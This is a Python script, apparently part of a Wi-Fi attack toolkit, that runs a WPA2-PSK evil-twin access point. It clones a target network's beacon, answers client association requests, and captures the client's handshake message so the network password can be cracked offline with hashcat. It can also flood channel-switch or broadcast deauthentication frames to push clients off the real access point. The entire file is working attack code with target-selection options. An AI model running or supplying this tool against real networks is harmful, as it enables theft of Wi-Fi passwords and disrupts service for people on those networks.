"""WPA2-PSK FakeAP reference: clone a target's beacon, stand up a WPA2-only twin on a decoy
channel, and capture a real client's 4-way M2 (its MIC binds the real PSK, crackable offline).

The card ACKs frames addressed to our spoofed BSSID in silicon (active monitor, SIFS); we answer
probe/auth/assoc and send M1 (random ANonce) from Python, then record the client's M2 and write a
hashcat WPA*02 line. With --txcard we also spray CSA beacons on the target's real channel to punt
clients onto the twin. Exact-BSSID clone: the hashline BSSID is the twin the client bound to.

  uv run python scripts/ap/fake_ap.py --apcard <substr> --bssid <ap> --target-channel 11 \
      [--txcard <substr>] [--channel 1] [--ssid Name] [--out file.hc22000] [--debug]

Output prefixes: [+] ok   [*] step   [#] a client event   [-] a problem.
"""
import argparse
import asyncio
import logging
import os
import struct
import sys
import tempfile
import time
from pathlib import Path

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:                                                 # noqa: BLE001
    pass

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent / "src"))

from wifit3.device.manager import wlan_ifaces
from wifit3.chips.driver import FakeMacSupport
from wifit3.dot11 import build_deauth
from wifit3.dot11.ap import beacon_clone, auth_resp, assoc_resp, eapol_m1
from wifit3.dot11.probe import probe_resp
from wifit3.dot11.csa import build_csa_beacon
from wifit3.dot11.ie import ssid_ie, rates_ie, ext_rates_ie, ds_param_ie, GENERIC_RSN_IE
from wifit3.models import Handshake, HandshakeMessage
from wifit3.crack.hc22000_format import eapol_hashlines

_BCAST = b"\xff\xff\xff\xff\xff\xff"
_BEACON_INTERVAL_TU = 100
_BEACON_PERIOD_S = _BEACON_INTERVAL_TU * 1024 / 1_000_000
_CSA_BURST = 64
_CSA_INTRA_S = 0.002
_CSA_INTER_S = 0.180


def _mac_bytes(s: str) -> bytes:
    return bytes(int(x, 16) for x in s.split(":"))


def _mac_str(b: bytes) -> str:
    return ":".join(f"{x:02x}" for x in b)


def _restamp_tsf(beacon: bytes) -> bytes:
    return beacon[:24] + struct.pack("<Q", int(time.time() * 1_000_000)) + beacon[32:]


def _synth_beacon(bssid: bytes, ssid: str, channel: int) -> bytes:
    """Fallback WPA2-PSK beacon when the real one can't be captured (AP out of range)."""
    hdr = b"\x80\x00" + b"\x00\x00" + _BCAST + bssid + bssid + b"\x00\x00"
    fixed = struct.pack("<Q", 0) + struct.pack("<H", _BEACON_INTERVAL_TU) + b"\x11\x04"
    tags = (ssid_ie(ssid) + rates_ie() + ds_param_ie(channel) + ext_rates_ie() + GENERIC_RSN_IE)
    return hdr + fixed + tags


async def capture_beacon(iface, bssid: str, channel: int, timeout: float) -> bytes | None:
    """Tune to the target channel and return the target's raw beacon, or None on timeout."""
    await iface.set_channel(channel)
    got: dict[str, bytes] = {}
    loop = asyncio.get_running_loop()
    fut = loop.create_future()

    def _on(pkt) -> None:
        if pkt.type == "beacon" and pkt.bssid == bssid and pkt.raw and not got:
            got["raw"] = pkt.raw
            if not fut.done():
                fut.set_result(pkt.raw)

    iface.register_rx_callback(_on)
    try:
        return await asyncio.wait_for(fut, timeout)
    except asyncio.TimeoutError:
        return None
    finally:
        iface.unregister_rx_callback(_on)


class ApResponder:
    """Barebones FakeAP responder: answers probe/auth/assoc, opens the 4-way with our M1,
    records the client's M2, and writes the crackable WPA*02 line. The stateful campaign
    version (campaigns/eviltwin) lands later; this proves the mechanism."""

    def __init__(self, iface, bssid: bytes, ssid: str, channel: int, beacon_frame: bytes,
                 out_path: Path):
        self.iface = iface
        self.bssid = bssid
        self.bssid_str = _mac_str(bssid)
        self.ssid = ssid
        self.channel = channel
        self.beacon_frame = beacon_frame
        self.out_path = out_path
        self._probe_resp = probe_resp(bssid, ssid, channel)
        self.anonce: dict[bytes, bytes] = {}          # client -> ANonce we sent in M1
        self.captured: set[bytes] = set()
        self.stats = {"probe": 0, "auth": 0, "assoc": 0, "m2": 0}

    def on_rx(self, pkt) -> None:
        raw = pkt.raw
        if len(raw) < 24:
            return
        client = raw[10:16]
        if pkt.type == "eapol":
            self._on_eapol(pkt, client)
            return
        if pkt.type_id != 0:
            return
        addr1 = raw[4:10]
        subtype = pkt.subtype_id
        if subtype == 0x04:                           # probe request
            ssid = getattr(pkt, "ssid", None)
            if ssid in (None, "", "<hidden>", self.ssid):
                frame = self._probe_resp[:4] + client + self._probe_resp[10:]
                self._send(frame, "probe", client)
        elif addr1 != self.bssid:                     # auth/assoc must be to us
            return
        elif subtype == 0x0B:                         # authentication
            self._send(auth_resp(self.bssid, client), "auth", client)
        elif subtype in (0x00, 0x02):                 # (re)association request
            self._send(assoc_resp(self.bssid, client), "assoc", client)
            self._send_m1(client)

    def _send(self, frame: bytes, kind: str, client: bytes) -> None:
        self.stats[kind] += 1
        print(f"[#] {kind:5s} #{self.stats[kind]} from {_mac_str(client)} -> responded")
        asyncio.create_task(self.iface.send_no_wait(frame))

    def _send_m1(self, client: bytes) -> None:
        anonce = os.urandom(32)
        self.anonce[client] = anonce
        asyncio.create_task(self.iface.send_no_wait(eapol_m1(self.bssid, client, anonce, replay=1)))
        print(f"[#] M1    -> {_mac_str(client)} (ANonce {anonce[:4].hex()}...)")

    def _on_eapol(self, pkt, client: bytes) -> None:
        if getattr(pkt, "msg_num", 0) != 2 or client in self.captured:
            return
        anonce = self.anonce.get(client)
        if anonce is None:                            # M2 for an assoc we didn't answer
            return
        self.stats["m2"] += 1
        print(f"[#] M2    <- {_mac_str(client)} (SNonce {(pkt.nonce or b'')[:4].hex()}...)")
        hs = self._assemble(client, anonce, pkt)
        lines = eapol_hashlines(self.ssid, hs)
        if not lines:
            print(f"[-] M2 from {_mac_str(client)} did not form a crackable pair")
            return
        self.captured.add(client)
        with self.out_path.open("a", encoding="utf-8") as fh:
            for line in lines:
                fh.write(line + "\n")
        print(f"[+] captured crackable handshake from {_mac_str(client)} -> {self.out_path}")
        for line in lines:
            print(f"    {line}")

    def _assemble(self, client: bytes, anonce: bytes, m2) -> Handshake:
        m1_frame = eapol_m1(self.bssid, client, anonce, replay=1)
        hs = Handshake(bssid=self.bssid_str, client_mac=_mac_str(client),
                       beacon_frame=self.beacon_frame, akm_offered=[2, 8], akm_client=2)
        hs.messages.append(HandshakeMessage(
            raw=m1_frame, msg_num=1, replay_hex="0000000000000001",
            nonce=anonce, mic=bytes(16), key_data_len=0,
            eapol_payload=m1_frame[32:], timestamp=time.time()))
        hs.messages.append(HandshakeMessage(
            raw=m2.raw, msg_num=2, replay_hex=(m2.replay_counter or b"").hex(),
            nonce=m2.nonce or b"", mic=m2.mic or b"", key_data_len=m2.key_data_len,
            eapol_payload=m2.payload, timestamp=time.time()))
        return hs


async def _beacon_loop(iface, twin: bytes) -> None:
    while True:
        await iface.send_no_wait(_restamp_tsf(twin))
        await asyncio.sleep(_BEACON_PERIOD_S)


async def _punt_loop(iface, target_channel: int, frames: list[bytes]) -> None:
    if iface.current_channel != target_channel:
        await iface.set_channel(target_channel)
    print(f"[*] punting on ch {target_channel}: {len(frames)} frame type(s) in bursts")
    while True:
        for _ in range(_CSA_BURST):
            for frame in frames:
                await iface.send_no_wait(frame)
            await asyncio.sleep(_CSA_INTRA_S)
        await asyncio.sleep(_CSA_INTER_S)


def _pick(ifaces, substr: str):
    return next((i for i in ifaces if substr.lower() in (i.description or "").lower()), None)


async def main(a) -> None:
    logging.basicConfig(level=logging.DEBUG if a.debug else logging.ERROR)
    ifaces = wlan_ifaces()
    apcard = _pick(ifaces, a.apcard)
    txcard = _pick(ifaces, a.txcard) if a.txcard else None
    if apcard is None:
        print(f"[-] no card matching --apcard '{a.apcard}'. plugged in:")
        for i in ifaces:
            print(f"      {i.description}")
        return
    if a.txcard and txcard is None:
        print(f"[-] no card matching --txcard '{a.txcard}'")
        return
    if txcard is apcard:
        print("[-] --apcard and --txcard resolved to the same device; pick distinct substrings")
        return

    support = apcard.driver.FAKE_MAC
    print(f"[+] apcard: {apcard.description}  (FAKE_MAC={support.value})")
    if support in (FakeMacSupport.NONE, FakeMacSupport.UNIMPLEMENTED):
        print(f"[-] apcard can't hardware-ACK a chosen MAC ({support.value}); aborting.")
        return
    if support is FakeMacSupport.FIXED_MAC:
        print("[-] apcard is FIXED_MAC: it can't clone an exact BSSID. Aborting.")
        return

    print("[*] connecting apcard...")
    if not await apcard.connect():
        print("[-] apcard connect failed")
        return
    if txcard is not None:
        print(f"[+] txcard: {txcard.description}")
        if not await txcard.connect():
            print("[-] txcard connect failed")
            return

    bssid = _mac_bytes(a.bssid)                                        # the real AP: captured + punted
    twin_bssid = _mac_bytes(a.twin_bssid) if a.twin_bssid else bssid   # advertised twin (== real for exact clone)
    cap_iface = txcard or apcard
    print(f"[*] capturing {a.bssid} beacon on ch {a.target_channel}...")
    real = await capture_beacon(cap_iface, a.bssid, a.target_channel, timeout=a.capture_timeout)
    if real is None:
        print(f"[-] no beacon from {a.bssid} in {a.capture_timeout}s; synthesizing a twin beacon")
        ssid = a.ssid or "FakeAP-Test"
        twin = _synth_beacon(twin_bssid, ssid, a.channel)
        beacon_frame = twin
    else:
        ssid = a.ssid or _ssid_of(real) or "FakeAP-Test"
        twin = beacon_clone(real, a.channel)
        twin = twin[:10] + twin_bssid + twin_bssid + twin[22:]         # advertise twin_bssid (exact clone: no-op)
        beacon_frame = real
        print(f"[+] cloned real beacon ({len(real)} B) -> WPA2-only twin ({len(twin)} B) "
              f"bssid {_mac_str(twin_bssid)}, ssid '{ssid}'")

    await apcard.set_channel(a.channel)
    armed = await apcard.set_fake_mac(twin_bssid, twin_bssid)
    if not armed or _mac_bytes(armed) != twin_bssid:
        print(f"[-] active monitor did not arm on the twin BSSID (got {armed}); aborting.")
        return
    print(f"[+] armed: hardware ACKs frames to {armed} on ch {a.channel}")

    responder = ApResponder(apcard, twin_bssid, ssid, a.channel, beacon_frame, Path(a.out))
    apcard.register_rx_callback(responder.on_rx)
    print(f"[*] beaconing '{ssid}' (WPA2-PSK) on ch {a.channel} as {armed}")
    print(f"[*] writing captures to {a.out}. Ctrl-C to stop.\n")

    tasks = [asyncio.create_task(_beacon_loop(apcard, twin))]
    if txcard is not None:
        punt_frames = []
        if a.punt in ("csa", "both"):
            punt_frames.append(build_csa_beacon(real if real is not None else twin, a.channel))
        if a.punt in ("deauth", "both"):
            punt_frames.append(build_deauth(_BCAST, bssid, bssid, 7))   # real AP -> broadcast
        tasks.append(asyncio.create_task(_punt_loop(txcard, a.target_channel, punt_frames)))

    try:
        await asyncio.gather(*tasks)
    except (KeyboardInterrupt, asyncio.CancelledError):
        pass
    finally:
        for t in tasks:
            t.cancel()
        print(f"\n[+] final: probe={responder.stats['probe']} auth={responder.stats['auth']} "
              f"assoc={responder.stats['assoc']} m2={responder.stats['m2']} "
              f"captured={len(responder.captured)}")
        apcard.unregister_rx_callback(responder.on_rx)
        try:
            await apcard.clear_fake_mac()
        except Exception:                                     # noqa: BLE001
            pass
        await apcard.close()
        if txcard is not None:
            await txcard.close()


def _ssid_of(beacon: bytes) -> str | None:
    """Read the SSID IE (tag 0) out of a captured beacon, or None if hidden/absent."""
    tags = beacon[36:]
    ptr = 0
    while ptr + 2 <= len(tags):
        end = ptr + 2 + tags[ptr + 1]
        if end > len(tags):
            break
        if tags[ptr] == 0x00:
            name = tags[ptr + 2:end]
            return name.decode("utf-8", "replace") if name else None
        ptr = end
    return None


if __name__ == "__main__":
    p = argparse.ArgumentParser(description="WPA2-PSK FakeAP reference + M2 capture")
    p.add_argument("--apcard", required=True, help="substring of the FakeAP card (SPOOFABLE)")
    p.add_argument("--txcard", default="", help="substring of the punt card (CSA on target channel)")
    p.add_argument("--bssid", required=True, help="BSSID of the real target (captured + punted)")
    p.add_argument("--twin-bssid", default="", help="BSSID to advertise for the twin (default: exact clone of --bssid)")
    p.add_argument("--ssid", default="", help="override SSID (default: read from the cloned beacon)")
    p.add_argument("--channel", type=int, default=1, help="decoy channel for the twin")
    p.add_argument("--target-channel", type=int, default=11, help="the target AP's real channel")
    p.add_argument("--punt", choices=("csa", "deauth", "both"), default="csa",
                   help="how to punt clients off the real AP on the target channel")
    p.add_argument("--capture-timeout", type=float, default=10.0)
    p.add_argument("--out", default=str(Path(tempfile.gettempdir()) / "eviltwin.hc22000"))
    p.add_argument("--debug", action="store_true")
    try:
        asyncio.run(main(p.parse_args()))
    except KeyboardInterrupt:
        pass
